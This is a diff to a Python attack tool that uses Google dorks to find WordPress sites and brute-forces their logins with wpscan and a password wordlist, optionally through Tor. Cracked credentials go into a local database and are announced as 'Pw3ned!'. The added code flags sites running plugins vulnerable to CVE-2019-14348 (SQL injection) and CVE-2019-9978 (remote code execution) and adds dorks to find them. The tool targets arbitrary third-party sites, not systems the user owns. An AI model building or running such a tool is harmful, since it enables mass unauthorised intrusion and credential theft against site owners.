@@ -17,36 +17,70 @@ from prettytable import from_db_cursor
 from prettytable import PrettyTable
 
 
+def checkvuln(pathfile):
+    """Check for common vulnerabilities"""
+
+    with open(pathfile) as json_file:
+        obj_data = json.load(json_file)
+        # If 'password_attack' string exist that means scan was finished successful
+        #if 'password_attack' in obj_data:
+        #    if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
+        #        print(colored("\t > JoomSport " + obj_data['plugins']['joomsport-sports-league-results-management']['version']['number'] + " is vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
+        if 'joomsport' in str(obj_data):
+            print('joomsport FOUND')
+            # Check for vulnerability version in JoomSport 3.3 - SQL INJECTION
+            if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
+                print(colored("\t > Found JoomSport " + obj_data['plugins']['joomsport-sports-league-results-management']['version']['number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
+        if 'Social Warfare' in str(obj_data):
+            # Check for vulnerability version in Social Warfare Plugin < 3.5.3 - RCE
+            if str(obj_data['plugins']['social-warfare']['version']['number']) < '3.5.3':
+                print(colored("\t > Found Social Warfare " + obj_data['plugins']['social-warfare']['version']['number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
+        # Check WAF
+        if 'WAF' in obj_data.values():
+            print(colored("\t WAF Detected!", 'red'))
+        # Check if timeout is reached
+        if 'Timeout was reached' in obj_data.values():
+            print(colored("\t Timeout Reached!", 'red'))
+        # Check if site is not running wordpress (due to wrong result in dork, happens!)
+        if 'scan_aborted' in str(obj_data):
+            print(colored("\t Website is up, but does not seem to be running WordPress!", 'red'))
+
 def showdorks():
     """Show Wordpress google dorks available and returns choosen"""
 
     # Get all Wordpress sites general query
     dork1 = "\"index of\" inurl:wp-content/\""
-    # Get all Wordpress sites using wp-shopping-cart plugin
+    # Get all Wordpress sites using WP Shopping Cart plugin
     dork2 = "\"inurl:\"/wp-content/plugins/wp-shopping-cart/\""
     # Get all Wordpress HTTP older sites (exclude pdf files from results)
     dork3 = "inurl:wp-content/ inurl:http before:2016 -filetype.pdf"
     # Get all Wordpress sites another general query
     dork4 = "\"index of \":wp-content/ intitle:\"WordPress\""
+    # Get all Wordpress sites using JoomSport plugin
+    dork5 = "intext:powered by JoomSport - sport WordPress plugin"
+    # Get all Wordpress sites using Social Warfare plugin
+    dork6 = "inurl:wp-content/plugins/social-warfare"
 
     table = PrettyTable()
 
     table.field_names = ["NUM", "DORK", "INFO"]
 
     table.add_row([1, dork1, "Wordpress general query"])
-    table.add_row([2, dork2, "Wordpress wp-shopping-cart plugin"])
+    table.add_row([2, dork2, "Wordpress WP Shopping Cart"])
     table.add_row([3, dork3, "Wordpress HTTP older sites"])
     table.add_row([4, dork4, "Wordpress another general query"])
+    table.add_row([5, dork5, "Wordpress JoomSport (CVE-2019-14348)"])
+    table.add_row([6, dork6, "Wordpress Social Warfare (CVE-2019-9978)"])
 
     print()
     print(colored(table, 'magenta'))
     print()
 
     while True:
-        response = input(colored(" Choose dork to run [1-4] ", 'yellow'))
+        response = input(colored(" Choose dork to run [1-6] ", 'yellow'))
         if not response.isnumeric():
             continue
-        elif int(response) in range(1,5):
+        elif int(response) in range(1,7):
             if int(response) == 1:
                 dork = dork1
             elif int(response) == 2:
@@ -55,6 +89,10 @@ def showdorks():
                 dork = dork3
             elif int(response) == 4:
                 dork = dork4
+            elif int(response) == 5:
+                dork = dork5
+            elif int(response) == 6:
+                dork = dork6
             break
         else:
             continue
@@ -97,26 +135,25 @@ def showcreds():
 def savecreds(pathfile, url):
     """Save possible credentials to db"""
 
-
     try:
         connection = sqlite3.connect(dbfile)
         cursor = connection.cursor()
         # Reading JSON from file - a nested dict -
         with open(pathfile) as json_file:
             obj_data = json.load(json_file)
-            # If 'password_attack is found then we scanning was completed
+            # If 'password_attack' string is found then means that scan was successful
             if 'password_attack' in obj_data:
                 for username in obj_data['password_attack']:
                     # username var will be empty if no creds found so insert will not be triggered
                     if username:
-                        print(colored(" * Pw3ned! " + url, 'magenta'))
+                        print(colored("\t > Pw3ned! (check creds.db) " + url, 'magenta'))
                         # Write credentials to db
                         cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
                         connection.commit()
                         credsfound = True
         cursor.close()
     except sqlite3.Error:
-        print(colored(" * Error while connecting to database!", 'red'))
+        print(colored(" Error while connecting to database!", 'red'))
 
 
 def wpscan(wpurl, wordlists, pathfile, usetor):
@@ -124,19 +161,20 @@ def wpscan(wpurl, wordlists, pathfile, usetor):
 
     if usetor:
         # Run wpscan with tor
-        os.system("wpscan --request-timeout 500 --connect-timeout 120 -t 4 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        os.system("wpscan --request-timeout 500 --connect-timeout 120 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        checkvuln(pathfile)
         savecreds(pathfile, wpurl)
     else:
         # Run wpscan without tor
         os.system("wpscan --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        checkvuln(pathfile)
         savecreds(pathfile, wpurl)
 
 
 def googledork(dork, amount, wordlist, usetor):
     """Wordpress google dork"""
 
-    print()
-    print(colored(" * Retrieving Google results..", 'red'))
+    print(colored(" Retrieving Google results..", 'red'))
     print()
 
     requ = 0
@@ -156,16 +194,12 @@ def googledork(dork, amount, wordlist, usetor):
         pathfile = loot_path + filename
 
         if Path(pathfile).is_file():
-            # File exist already so skip this host
-            print(colored(" - Skipping " + wordpress + " (already scanned)", 'red'))
-            time.sleep(0.1)
-            requ += 1
-            if requ >= int(amount):
-                break
+            # File exist already so skip this host and not increment requ var
+            print(colored(" - Skipping " + wordpress + " (already scanned)", 'green'))
             time.sleep(0.1)
             continue
 
-        print(colored(" + Scanning " + wordpress, 'red'))
+        print(colored(" + Scanning " + wordpress, 'green'))
         wpscan(wordpress, wordlist, pathfile, usetor)
         time.sleep(0.1)
         requ += 1
@@ -197,7 +231,7 @@ def main():
     rc = subprocess.call(['which', 'wpscan'], stdout=subprocess.PIPE)
     if rc:
         print()
-        print(colored(' * ERROR - This tool requires wpscan to run ! (https://github.com/wpscanteam/wpscan)', 'red'))
+        print(colored(' ERROR - This tool requires wpscan to run ! (https://github.com/wpscanteam/wpscan)', 'red'))
         exit(0)
 
     print(colored(" -------------------", 'green'))
@@ -228,7 +262,7 @@ def main():
     while True:
         response = input(colored(" Enter number of results to retrieve: ", 'yellow'))
         if not response.isnumeric():
-            print(colored(" * Please insert a number", 'red'))
+            print(colored(" Please insert a number", 'red'))
             continue
         else:
             amount = response
@@ -236,7 +270,7 @@ def main():
     while True:
         response = input(colored(" Type full path to password wordlist: ", 'yellow'))
         if not os.path.isfile(response):
-            print(colored(" * Unable to access file !", 'red'))
+            print(colored(" Unable to access file !", 'red'))
             continue
         else:
             wordlist = response
@@ -245,7 +279,7 @@ def main():
     usetor = False
 
     while True:
-        response = input(colored(" Do you want use TOR? [yes/no] ", 'yellow'))
+        response = input(colored(" Use WPscan with TOR ? [yes/no] ", 'yellow'))
         if not response.isalpha():
             continue
         if response == 'yes' or response == 'no':
@@ -256,14 +290,14 @@ def main():
         if rc:
             # Asking for valid response
             while True:
-                response = input(colored(" * Unable to find TOR! Run without it ? [yes/no]", 'yellow'))
+                response = input(colored(" Unable to find TOR! Run without it ? [yes/no]", 'yellow'))
                 if not response.isalpha():
-                    print(colored(" * Please type yes or no", 'red'))
+                    print(colored(" Please type yes or no", 'red'))
                     continue
                 if response == 'yes' or response == 'no':
                     break
             if response == 'yes':
-                print(colored(" * Running scan with TOR disabled..", 'red'))
+                print(colored(" Running scan with TOR disabled..", 'red'))
                 usetor = False
             else:
                 print(colored(" * Exiting..", 'yellow'))
@@ -271,7 +305,7 @@ def main():
         else:
             # Start TOR
             print()
-            print(colored(" * Starting tor network..", 'red'))
+            print(colored(" Starting TOR network..", 'red'))
             os.system("tor --quiet &")
             time.sleep(5)
             usetor = True
@@ -281,13 +315,13 @@ def main():
     if usetor:
         # Kill TOR
         print()
-        print(colored(" * Killing TOR pid..", 'yellow'))
+        print(colored(" Killing TOR pid..", 'red'))
         os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
 
     if credsfound:
-        print(colored(" * Completed - Passwords FOUND!", 'magenta'))
+        print(colored(" Completed - Passwords Found!", 'magenta'))
     else:
-        print(colored(" * Completed - Passwords Not Found", 'red'))
+        print(colored(" Completed - Passwords Not Found!", 'red'))
     exit(0)
 
 
